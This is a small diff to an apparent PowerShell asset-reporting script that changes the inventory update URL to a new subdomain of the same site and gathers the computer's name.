@@ -3,7 +3,7 @@
 
 ### Set some basic settings, such as the URL we're visiting and powershell-specific settings.
 $ProgressPreference = 'SilentlyContinue';
-$visit_url = "http://www.junklands.com/web/e/updateasset.php";
+$visit_url = "http://jadexplorer.junklands.com/e/updateasset.php";
 
 ### Gather information.
 $computer_name = Get-CimInstance -ClassName Win32_ComputerSystem -Property Name | Select-Object -ExpandProperty Name;
